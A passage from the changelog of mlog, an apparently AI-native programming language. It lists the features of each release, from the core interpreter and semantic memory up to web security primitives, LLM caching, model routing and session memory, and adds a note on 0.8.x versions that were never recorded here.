- Conversation state: `Conversation` declaration with TTL and message limits (Naryad 21)
- LLM response cache with configurable TTL (Naryad 21)
- Model routing: `LlmConfig` declaration with provider failover (Naryad 21)
- Context compression for long conversations (Naryad 21)
- Tool abstraction: `Tool` declaration with typed methods (Naryad 22)
- `Hook` declaration: before/after pattern hooks (Naryad 22)
- Session memory: `session_set`/`session_get`/`session_clear` builtins (Naryad 22)

### Infrastructure

- 32 integration test files (7 000+ lines of tests)
- 63 Architecture Decision Records
- CI pipeline: build + release binary (Linux x86_64)

---

## [0.7.5] — 2026-06-13

**Phase 7.5–7.6: Memory persistence, tokens, eval harness, session memory, audit.**

- Memory persistence e2e tests (JSON file-based storage)
- JWT-style token generation and verification
- Eval harness for testing learnable patterns with golden-file assertions
- `session_set`/`session_get`/`session_clear` session memory builtins
- Audit parser integration tests
- Server JSON body parsing for POST routes

---

## [0.7.3] — 2026-06-12

**Phase 7.3–7.4: Context compression, lifecycle, tool abstraction, hooks, DoD.**

- Context compression for long conversations
- Lifecycle control for flows and patterns
- Tool abstraction (`Tool` declaration)
- `Hook` declaration for before/after pattern execution
- Definition of Done framework with automated checks

---

## [0.7.1] — 2026-06-10

**Phase 7.1–7.2: Inspect, context loading, events, conversation state, LLM cache, model routing.**

- `inspect()` builtin for safe value introspection
- Context loading from entity/memory/fluid declarations
- Event streaming (`emit`/`on`)
- `Conversation` declaration with TTL and message limits
- LLM response cache with configurable TTL
- `LlmConfig` declaration for multi-provider model routing

---

## [0.6.0] — 2025-06-03

**Phase 6: Full-stack web platform with security by design.**

### Security — 6 levels, OWASP Top 10 closed

- **Type-safe HTML templates** — `template` construct returns opaque `Html` type, auto-escaping prevents XSS
- **Parameterized database queries** — `query(sql_literal, params)`, opaque `Query` type, SQL injection syntactically impossible
- **Encryption primitives** — `Secret`, `Encrypted`, `Hash` opaque types; `env()` maps to `Secret`; `encrypt`/`decrypt` via AES-256-GCM; `hash_password`/`verify_password`
- **Authentication & authorization** — session management (HMAC-SHA256 signed cookies), role-based access (`requires=[role]`), `require` assertions, `authenticate`/`session_login`/`session_logout`
- **CSRF & security headers** — double-submit token pattern, CSP/HSTS/X-Frame-Options/X-Content-Type-Options middleware
- **LLM sandbox** — sandboxed execution for learnable patterns, no direct HTML injection from AI responses

### Web platform

- **HTTP server** — `mlogserver` block with `port`, `middleware`, `route` declarations (Axum 0.8 + Tokio)
- **Routing** — `route "/path" method=GET/POST requires=[roles] { handler }`
- **Request parsing** — `form_data()`, `json_body()` built-in functions
- **Response** — `respond(status)`, `render(template, args)` for HTML output
- **Bot integration** — Telegram/Discord webhook routes, `send_message(chat_id, text)` outbound HTTP
- **CLI** — `mlog serve <file>` starts the HTTP server

### Language additions

- **`db` block** — database configuration with `pool_size` and `migrate`
- **`template` construct** — type-safe HTML templates with `{{ var }}` auto-escaping
- **`require` statement** — runtime assertion for authorization checks
- **40+ built-in functions** across string, math, web, crypto, auth, and bot domains

### Examples

- `p6_full_app.mlog` — 170-line full-stack application demonstrating all 6 security levels

---

## [0.5.0] — Phase 5: Language completeness

**Control flow, collections, string operations, modules, bytecode VM, JIT.**

- `let` bindings with `if/else` expressions
- `each item in list { ... }` and `while cond { ... }` loops
- `break` and `continue` in loops
- `match` expression with `exact`, `starts_with`, `contains`, `compare` arms
- List literals `[1.0, 2.0, 3.0]` with `get`, `push`, `len`, `first`, `last`, `reverse`
- String operations: `index_of`, `substring`, `char_at`, `starts_with`, `ends_with`, `contains`, `split`, `join`, `trim`, `replace`
- Module system: `import std/string as str` with qualified calls (`str.trim(s)`)
- Bytecode VM: 44 instructions, stack-based execution
- JIT compiler via Cranelift
- Self-hosted lexer
- REPL integration tests, semantic check integration tests

---

## [0.8.x] — archived (not formalized in this CHANGELOG)

Versions 0.8.0 through 0.8.9 were released informally (no git tags) and
their highlights were not captured in this CHANGELOG at the time. The
README.md version-highlights table still references them; the entries
there are the best summary available without reconstructing from
individual commits.

If you need the precise per-commit history for 0.8.x:

```bash
git log --oneline --grep="0\.8\." --reverse
```

Future naryads may formalize 0.8.x sections here by extracting
highlights from the actual commit history (Naryad №166 Block 2 noted
this gap; recovery requires verifying each highlight against the
real commit, not invented descriptions — see ADR-0110 §2
"contract before code").

---

## [0.3.0] — Phases 1–4: Core language, types, ML, ecosystem

**Probabilistic types, ML backend, knowledge graph, vector recall, LSP, packages.**

- **Phase 1**: Fluid types with probabilistic superposition, confidence propagation, entity store queries (`find()`)
- **Phase 2**: Knowledge graph (`relate`), vector recall (semantic memory), full adapt system (sandbox/mutate/rollback), ML learn statement
- **Phase 3**: CLI (`mlog run/repl/check`), LSP server, `mlogpkg` package manager, mdbook documentation
- **Phase 4**: Bytecode VM, JIT compiler (Cranelift), self-hosted lexer, IR generation

---

## [0.1.0] — M1–M5: Seven pillars, basic interpreter

**The foundation — AI-native language with seven semantic primitives.**

- **M1**: Entity (simple, struct, instance), pure pattern, linear flow, built-in functions (`upper`, `lower`, `len`, etc.)
- **M2**: Struct entities, rule engine with priority and confidence-based flow branching
- **M3**: Learnable patterns (LLM backend trait + mock), prompt engineering, few-shot caching, `adapt` statement
- **M4**: Semantic memory (`memorize`/`recall`/`forget`), knowledge graph (`relate`), memory decay
- **M5**: Sandbox execution, `mutate` with rollback on degradation
- Pest PEG grammar, hand-written AST, tree-walking interpreter
- Golden-file test framework (`examples/*.expected`)
